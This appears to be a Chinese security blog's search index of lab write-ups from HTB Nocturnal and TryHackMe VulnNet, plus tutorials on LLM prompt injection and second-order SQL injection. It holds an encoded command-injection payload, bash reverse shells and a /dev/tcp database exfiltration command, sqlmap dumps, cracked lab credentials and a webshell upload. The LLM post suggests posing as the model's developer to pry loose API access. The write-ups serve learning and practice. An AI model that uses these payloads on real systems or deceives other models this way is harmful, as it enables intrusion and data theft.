<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title></title>
      <link href="/2025/04/26/DE/"/>
      <url>/2025/04/26/DE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>htb-nocturnal</title>
      <link href="/2025/04/26/htb-nocturnal/"/>
      <url>/2025/04/26/htb-nocturnal/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="htb-nocturnal-解题记录"><a href="#htb-nocturnal-解题记录" class="headerlink" title="htb-nocturnal 解题记录"></a>htb-nocturnal 解题记录</h1><p><code>$command = &quot;zip -x &#39;./backups/*&#39; -r -P &quot; . $password . &quot; &quot; . $backupFile . &quot; .  &gt; &quot; . $logFile . &quot; 2&gt;&amp;1 &amp;&quot;;</code></p><p>$command &#x3D; “zip -x ‘.&#x2F;backups&#x2F;*’ -r -P<br>bash -c ‘id’<br> “ . $backupFile . “ .  &gt; “ . $logFile . “ 2&gt;&amp;1 &amp;”;</p><p>%0abash%09-c%09%22bash+-i+%3e%26+%2fdev%2ftcp%2f10.10.16.20%2f4443+0%3e%261%22%0a</p><p><a href="/../assets/img/htb-nocturnal/image.png" title="alt text" class="gallery-item"><img src="/../assets/img/htb-nocturnal/image.png" alt="alt text"></a></p><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.20&#x2F;4443 0&gt;&amp;1<br>bash+-i+%3e%26+%2fdev%2ftcp%2f10.10.16.20%2f4443+0%3e%261</p><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.20&#x2F;4443 0&gt;&amp;1</p><p>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.16.20&#x2F;4443 0&gt;&amp;1</p><p>ls</p><p>password&#x3D;%0abash%09-c%09%22bash%09-i%09%3e%26%09%2fdev%2ftcp%2f10.10.16.20%2f4443%090%3e%261%22%0a&amp;backup&#x3D;】</p><p>nc -lvp 8888 &gt; received_database.db</p><p>cat nocturnal_database.db &gt; &#x2F;dev&#x2F;tcp&#x2F;10.10.10.10&#x2F;8888</p><p><a href="/../assets/img/htb-nocturnal/image-1.png" title="alt text" class="gallery-item"><img src="/../assets/img/htb-nocturnal/image-1.png" alt="alt text"></a></p><p>为啥选择这个用户 可以cat &#x2F;etc&#x2F;passwd | grep bash 这个就是用户</p><p>4|tobias|55c82b1ccd55ab219b3b109b07d5061d</p><p>通过爆破或者查询</p><p><a href="/../assets/img/htb-nocturnal/image-2.png" title="alt text" class="gallery-item"><img src="/../assets/img/htb-nocturnal/image-2.png" alt="alt text"></a></p><p><a href="/../assets/img/htb-nocturnal/image-3.png" title="alt text" class="gallery-item"><img src="/../assets/img/htb-nocturnal/image-3.png" alt="alt text"></a></p><p><a href="https://github.com/bipbopbup/CVE-2023-46818-python-exploit">EXP</a></p><p>存在密码复用的情况</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> htb </tag>
            
            <tag> sec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AI安全</title>
      <link href="/2025/04/26/ai-and-sec/"/>
      <url>/2025/04/26/ai-and-sec/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="ai安全概述"><a href="#ai安全概述" class="headerlink" title="ai安全概述"></a>ai安全概述</h1><h1 id="ai安全前景"><a href="#ai安全前景" class="headerlink" title="ai安全前景"></a>ai安全前景</h1><h1 id="ai安全细分"><a href="#ai安全细分" class="headerlink" title="ai安全细分"></a>ai安全细分</h1><h1 id="ai安全应用"><a href="#ai安全应用" class="headerlink" title="ai安全应用"></a>ai安全应用</h1><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> sec </tag>
            
            <tag> ai </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LLM攻击</title>
      <link href="/2025/04/19/LLM-attack/"/>
      <url>/2025/04/19/LLM-attack/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="什么是大型语言模型？"><a href="#什么是大型语言模型？" class="headerlink" title="什么是大型语言模型？"></a>什么是大型语言模型？</h2><p>大型语言模型 （LLM） 是一种 AI 算法，可以处理用户输入并通过预测单词序列来创建合理的响应。他们在巨大的半公开数据集上接受训练，使用机器学习来分析语言的各个组成部分如何组合在一起。<br>LLM 通常提供一个聊天界面来接受用户输入，称为提示。允许的输入部分由 input validation rules 控制。<br>LLM 在现代网站中可以有广泛的用例：<br>客户服务，例如虚拟助手。<br>译本。<br>SEO 改进。<br>分析用户生成的内容，例如跟踪页面评论的语气。</p><h1 id="LLM-攻击和提示注入"><a href="#LLM-攻击和提示注入" class="headerlink" title="LLM 攻击和提示注入"></a>LLM 攻击和提示注入</h1><p>许多 Web LLM 攻击依赖于一种称为提示注入的技术。这是攻击者使用构建的提示来纵 LLM 输出的地方。提示注入可能会导致 AI 采取超出其预期目的的作，例如对敏感 API 进行错误调用或返回不符合其准则的内容。</p><h1 id="检测-LLM-漏洞"><a href="#检测-LLM-漏洞" class="headerlink" title="检测 LLM 漏洞"></a>检测 LLM 漏洞</h1><p>我们推荐的检测 LLM 漏洞的方法是：<br>确定 LLM 的输入，包括直接 （如提示） 和间接 （如训练数据） 输入。<br>确定 LLM 可以访问哪些数据和 API。<br>探测这个新的攻击面是否存在漏洞。】</p><h1 id="利用-LLM-API、函数和插件"><a href="#利用-LLM-API、函数和插件" class="headerlink" title="利用 LLM API、函数和插件"></a>利用 LLM API、函数和插件</h1><p>LLM 通常由专门的第三方提供商托管。网站可以通过描述供 LLM 使用的本地 API 来为第三方 LLM 提供对其特定功能的访问权限。<br>例如，客户支持 LLM 可能有权访问管理用户、订单和库存的 API。</p><h1 id="LLM-API-的工作原理"><a href="#LLM-API-的工作原理" class="headerlink" title="LLM API 的工作原理"></a>LLM API 的工作原理</h1><p>将 LLM 与 API 集成的工作流程取决于 API 本身的结构。调用外部 API 时，某些 LLM 可能要求客户端调用单独的函数终端节点（实际上是私有 API），以便生成可发送到这些 API 的有效请求。此作的工作流可能如下所示：<br>客户端使用用户的提示符调用 LLM。<br>LLM 检测到需要调用函数并返回一个 JSON 对象，其中包含符合外部 API 架构的参数。<br>客户端使用提供的参数调用函数。<br>客户端处理函数的响应。<br>客户端再次调用 LLM，将函数响应附加为新消息。<br>LLM 使用函数 response 调用外部 API。<br>LLM 总结了此 API 调用的结果，并将其返回给用户。<br>此工作流程可能会产生安全隐患，因为 LLM 实际上是代表用户调用外部 API，但用户可能不知道这些 API 正在被调用。理想情况下，在 LLM 调用外部 API 之前，应向用户显示确认步骤。</p><h1 id="映射-LLM-API-攻击面"><a href="#映射-LLM-API-攻击面" class="headerlink" title="映射 LLM API 攻击面"></a>映射 LLM API 攻击面</h1><p>术语“过度代理”是指 LLM 可以访问可以访问敏感信息的 API，并可能被说服以不安全的方式使用这些 API。这使攻击者能够将 LLM 推到其预期范围之外，并通过其 API 发起攻击。<br>使用 LLM 攻击 API 和插件的第一阶段是找出 LLM 可以访问哪些 API 和插件。一种方法是简单地询问 LLM 它可以访问哪些 API。然后，您可以询问有关任何感兴趣的 API 的更多详细信息。<br>如果 LLM 不合作，请尝试提供误导性的上下文并重新提出问题。例如，您可以声称您是 LLM 的开发人员，因此应该具有更高级别的权限。</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Sec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Sec </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobalStrike指南</title>
      <link href="/2024/12/22/CobalStrike/"/>
      <url>/2024/12/22/CobalStrike/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>一直没在用过CS今天玩一玩</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>枚举在渗透测试中的常见应用</title>
      <link href="/2024/12/11/vulnnetendgame/"/>
      <url>/2024/12/11/vulnnetendgame/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote><p>侵入这个模拟的易受攻击的基础设施。没有谜题。枚举是关键。</p></blockquote><p>目标: <a href="http://vulnnet.thm/">http://vulnnet.thm/</a>  10.10.39.63</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[18:22:25] 301 -  308B  - /css  -&gt;  http://vulnnet.thm/css/</span><br><span class="line">[18:22:40] 301 -  310B  - /fonts  -&gt;  http://vulnnet.thm/fonts/</span><br><span class="line">[18:22:48] 200 -  518B  - /images/</span><br><span class="line">[18:22:48] 301 -  311B  - /images  -&gt;  http://vulnnet.thm/images/</span><br><span class="line">[18:22:55] 200 -  105B  - /js/</span><br><span class="line">[18:23:34] 200 -  430B  - /README.txt</span><br><span class="line">[18:23:40] 403 -  276B  - /server-status/</span><br><span class="line">[18:23:40] 403 -  276B  - /server-status</span><br></pre></td></tr></table></figure><p>子域</p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211182854.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211182854.png" alt="image.png"></a></p><p>blog.vulnnet.thm<br>shop.vulnnet.thm<br>api.vulnnet.thm</p><p>有个api请求<br><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211183337.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211183337.png" alt="image.png"></a></p><p>存在sql注入<br><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211183652.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211183652.png" alt="image.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &#x27;http://api.vulnnet.thm/vn_internals/api/v2/fetch/?blog=1&#x27; -p blog --dbms=mysql  -D vn_admin -T be_users -C username,password,admin --dump</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cut -d &quot;,&quot; -f2 home/leo/.local/share/sqlmap/output/api.vulnnet.thm/dump/vn_admin/be_users.csv &gt; ./test1.txt</span><br></pre></td></tr></table></figure><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211185547.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211185547.png" alt="image.png"></a></p><p>通过指定密码blog 下的password 爆破hash</p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211191531.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211191531.png" alt="image.png"></a></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211192935.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211192935.png" alt="image.png"></a></p><p>获取登录凭证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chris_w</span><br><span class="line">vAxWtmNzeTz</span><br></pre></td></tr></table></figure><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211192112.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211192112.png" alt="image.png"></a></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211192258.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211192258.png" alt="image.png"></a></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211193750.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211193750.png" alt="image.png"></a></p><p>取消黑名单</p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211194102.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211194102.png" alt="image.png"></a></p><p>上传webshell<br><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211194425.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211194425.png" alt="image.png"></a></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211194542.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241211194542.png" alt="image.png"></a></p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> #SQLI </tag>
            
            <tag> #sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE的获取shell</title>
      <link href="/2024/12/11/Athena/"/>
      <url>/2024/12/11/Athena/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><p>涉及到的知识点<br>commix<br><a href="https://github.com/commixproject/commix">https://github.com/commixproject/commix</a><br>对于代码执行进行测试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commix -r r.txt</span><br></pre></td></tr></table></figure><p>pspy<br><a href="https://github.com/DominicBreuker/pspy">https://github.com/DominicBreuker/pspy</a><br>PSPY 是一个命令行工具，旨在窥探不需要 root 权限的进程。 它允许您查看其他用户运行的命令、cron 作业等在执行时运行。 非常适合在 CTF 中枚举 Linux 系统。 也非常适合向你的同事展示为什么在命令行上将 secret 作为参数传递是一个坏主意。</p><p>该工具从 procfs 扫描中收集信息。 放置在文件系统的选定部分上的 Inotify 观察程序会触发这些扫描，以捕获生存期较短的进程。</p><p>sh阅读本领<br>ko逆向的能力</p></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> #Linux </tag>
            
            <tag> #RCE </tag>
            
            <tag> pspy </tag>
            
            <tag> commix </tag>
            
            <tag> smb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高级 SQL 注入</title>
      <link href="/2024/12/07/advancedsqlinjection/"/>
      <url>/2024/12/07/advancedsqlinjection/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote></blockquote><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>SQL 注入仍然是 Web 应用程序最严重和最广泛的安全漏洞之一。当攻击者利用 Web 应用程序执行任意 SQL 查询的能力，导致未经授权访问数据库、数据泄露、数据操纵，甚至完全控制应用程序时，就会出现这种威胁。在这个房间里，我们将了解高级 SQL 注入技术，全面了解复杂的攻击向量和缓解策略。  </p><p>在这个房间结束时，您将对各种 SQL 注入技术有更深入的了解。这将使您具备在多种情况下识别和利用这些漏洞的技能，并实施强大的防御措施来保护您的应用程序。  </p><p>学习目标</p><p>在整个课程中，您将全面了解以下关键概念：</p><ul><li><p>二阶 SQL 注入  </p></li><li><p>过滤器规避</p></li><li><p>带外 SQL 注入</p></li><li><p>自动化技术</p></li><li><p>缓解措施</p></li></ul><p>我们介绍了基本技术，例如基于错误和基于联合的 SQL 注入，以及盲目 SQL 注入方法，例如基于布尔值和基于时间的攻击。以下是对 SQL 注入核心基本类型的房间的快速回顾<br><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207162649.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207162649.png" alt="image.png"></a></p><h2 id="带内-SQL-注入"><a href="#带内-SQL-注入" class="headerlink" title="带内 SQL 注入"></a>带内 SQL 注入</h2><p>这种技术被认为是最常见和最直接的 SQL 注入攻击类型。在这种技术中，攻击者使用相同的通信通道进行数据的注入和检索。带内 SQL 注入有两种主要类型：  </p><ul><li><strong>基于错误的 SQL 注入</strong>：攻击者操纵 SQL 查询以从数据库生成错误消息。这些错误消息通常包含有关数据库结构的信息，可用于进一步利用数据库。示例： .如果在错误消息中返回数据库版本，则会显示有关数据库的信息。<code>SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))</code></li><li><strong>基于 Union 的 SQL 注入</strong>：攻击者使用 UNION SQL 运算符将两个或多个 SELECT 语句的结果合并为一个结果，从而从其他表中检索数据。示例： .<code>SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin</code></li></ul><h2 id="推理（盲目）SQL-注入"><a href="#推理（盲目）SQL-注入" class="headerlink" title="推理（盲目）SQL 注入"></a>推理（盲目）SQL 注入</h2><p>推理 SQL 注入不会直接通过 Web 应用程序传输数据，这使得利用它更具挑战性。相反，攻击者会发送有效负载并观察应用程序的行为和响应时间，以推断有关数据库的信息。推理 SQL 注入有两种主要类型：  </p><ul><li><strong>基于布尔值的盲目 SQL 注入</strong>：攻击者向数据库发送 SQL 查询，迫使应用程序根据 true 或 false 条件返回不同的结果。通过分析应用程序的响应，攻击者可以推断有效负载是 true 还是 false。示例： . 如果页面内容或行为根据条件发生变化，攻击者可以推断结果。<code>SELECT * FROM users WHERE id = 1 AND 1=1 (true condition) versus SELECT * FROM users WHERE id = 1 AND 1=2 (false condition)</code></li><li><strong>基于时间的盲目 SQL 注入</strong>：攻击者向数据库发送 SQL 查询，如果条件为 true，则延迟响应指定时间。通过测量响应时间，攻击者可以推断条件是 true 还是 false。例如，.如果响应延迟 5 秒，攻击者可以推断出条件为 true。<code>SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY &#39;00:00:05&#39;--</code></li></ul><h2 id="带外-SQL-注入"><a href="#带外-SQL-注入" class="headerlink" title="带外 SQL 注入"></a>带外 SQL 注入</h2><p>当攻击者无法使用相同的通道发起攻击并收集结果，或者服务器响应不稳定时，会使用带外 SQL 注入。该技术依赖于数据库服务器发出带外请求（例如 HTTP 或 DNS）以将查询结果发送给攻击者。HTTP 通常用于带外 SQL 注入，以将查询结果发送到攻击者的服务器。 我们将在这个房间里详细讨论它。</p><p>每种类型的 SQL 注入技术都有其优点和挑战。了解这些技术对于识别和缓解 Web 应用程序中的 SQL 注入漏洞至关重要。带内 SQL 注入易于利用和检测，但噪音很大，很容易被监控。推理（盲）SQL 注入更难利用，需要多个请求，但可以在详细错误消息不可用时使用。带外 SQL 注入不太常见且非常有效，需要外部服务器控制，并且依赖于数据库发出带外请求的能力。通过掌握这些技术，渗透测试人员可以有效地识别和利用 SQL 注入漏洞，帮助组织保护其 Web 应用程序免受这些关键威胁。</p><h1 id="二阶-SQL-注入"><a href="#二阶-SQL-注入" class="headerlink" title="二阶 SQL 注入"></a>二阶 SQL 注入</h1><p>二阶 SQL 注入（也称为存储 SQL 注入）利用了以下漏洞：用户提供的输入被保存并随后在应用程序的不同部分使用，可能在一些初始处理之后。这种类型的攻击更加隐蔽，因为恶意 SQL 代码不需要立即导致 SQL 语法错误或其他明显问题，这使得它更难使用标准输入验证技术进行检测。当数据被检索并在 SQL 命令中使用时，第二次使用数据时，会发生注入，因此名称为 “<strong>Second Order</strong>”。<br>⚠️upload failed, check dev console<br>冲击</p><p>Second-Order SQL Injection 的危险在于它能够绕过典型的前端防御，例如基本输入验证或清理，这些防御仅发生在初始数据输入时。由于有效载荷在第一步不会造成中断，因此可以忽略它，直到为时已晚，从而使攻击特别隐蔽。  </p><p><strong>示例</strong><br>：我们将使用书评应用程序。该应用程序允许用户通过网页 （） 添加新书籍。系统会提示用户提供有关他们希望添加到数据库的书籍的详细信息。您可以通过 <a href="http://10.10.164.79/case1.">访问该应用程序。</a>收集的数据包括 、 和 。让我们考虑添加一本具有以下详细信息的书：<strong>SSN：UI00012</strong>，<strong>书名：Intro to PHP</strong>，<strong>作者：Tim</strong>。此信息通过页面上的表单输入，提交后，将存储在 <strong>BookStore</strong> 数据库中，如下所示：<code>add.php``http://10.10.164.79/second/add.php``SSN``book_name``author``add.php</code></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163127.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163127.png" alt="image.png"></a><br>正如我们所知，二阶 SQL 注入的识别非常具有挑战性。与利用实时处理漏洞的传统 SQL 注入不同，当以前存储在数据库中的数据稍后用于 SQL 查询时，就会发生这种情况。检测此漏洞通常需要了解数据如何流经应用程序并重复使用，因此需要深入了解后端操作。  </p><p><strong>代码分析</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ssn</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ssn&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$book_name</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;book_name&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$author</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">real_escape_string</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;author&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO books (ssn, book_name, author) VALUES (&#x27;<span class="subst">$ssn</span>&#x27;, &#x27;<span class="subst">$book_name</span>&#x27;, &#x27;<span class="subst">$author</span>&#x27;)&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>) === <span class="literal">TRUE</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;text-green-500&#x27;&gt;New book added successfully&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p class=&#x27;text-red-500&#x27;&gt;Error: &quot;</span> . <span class="variable">$conn</span>-&gt;error . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该代码使用该方法对输入中的特殊字符进行转义。虽然此方法可以通过转义单引号和其他 SQL 元字符来降低立即 SQL 注入的一些风险，但它并不能保护应用程序免受二阶 SQLi 的攻击。这里的关键问题是缺少参数化查询，这对于防止 SQL 注入攻击至关重要。使用该方法插入数据时，它可能包含不会立即造成伤害但可以在后续检索时激活并在另一个 SQL 查询中使用的有效负载字符。例如，插入名称为 like 的书籍可能不会影响 <strong>INSERT</strong> 操作，但如果稍后在另一个 SQL 上下文中使用书籍名称而没有正确处理，则可能会产生严重影响。<code>real_escape_string()``real_escape_string()``Intro to PHP&#39;; DROP TABLE books;--</code></p><p>让我们尝试添加另一本 SSN 为 的书籍。<code>test&#39;</code></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207171142.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207171142.png" alt="image.png"></a></p><p>好了，SSN 已成功插入到数据库中。该应用程序包括通过类似 的界面更新书籍详细信息的功能。此界面可能会在可编辑的表单字段中显示现有书籍详细信息，根据以前存储的数据进行检索，然后根据用户输入对其进行更新。渗透测试人员将调查应用程序是否重用了以前存储且可能受污染的数据（例如 ）。然后，他将构建 SQL 查询，以使用这些可能受污染的数据更新记录，而无需进行适当的清理或参数化。通过操纵更新功能，测试人员可以查看在插入阶段添加的恶意负载是否在更新操作期间被执行。如果应用程序在此阶段未能采用适当的安全措施，则可能会激活早期注入的有效负载，从而导致执行有害的 SQL 命令，例如删除表。您可以访问该页面以更新任何图书详情。<code>test&#39;``update.php``book_name``&#39;; DROP TABLE books; --``http://10.10.164.79/second/update.php</code></p><p><a href="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163213.png" title="image.png" class="gallery-item"><img src="https://cdn.jsdelivr.net/gh/leonooo13/IMG/20241207163213.png" alt="image.png"></a><br>现在，让我们回顾一下代码。PHP 脚本允许用户更新 <strong>BookStore</strong> 数据库中的书籍详细信息。通过查询结构，我们将分析渗透测试人员可能寻找 SQL 注入漏洞的典型场景，特别关注在 SQL 查询中如何处理和利用用户输入。<code>update.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;update&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$unique_id</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;update&#x27;</span>];</span><br><span class="line">    <span class="variable">$ssn</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ssn_&#x27;</span> . <span class="variable">$unique_id</span>];</span><br><span class="line">    <span class="variable">$new_book_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;new_book_name_&#x27;</span> . <span class="variable">$unique_id</span>];</span><br><span class="line">    <span class="variable">$new_author</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;new_author_&#x27;</span> . <span class="variable">$unique_id</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$update_sql</span> = <span class="string">&quot;UPDATE books SET book_name = &#x27;<span class="subst">$new_book_name</span>&#x27;, author = &#x27;<span class="subst">$new_author</span>&#x27; WHERE ssn = &#x27;<span class="subst">$ssn</span>&#x27;; INSERT INTO logs (page) VALUES (&#x27;update.php&#x27;);&quot;</span>;</span><br><span class="line">..</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>该脚本首先检查请求方法是否为 POST，以及是否按下了更新按钮，这表示用户打算更新书籍的详细信息。在此之后，该脚本直接从 POST 数据中检索用户输入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 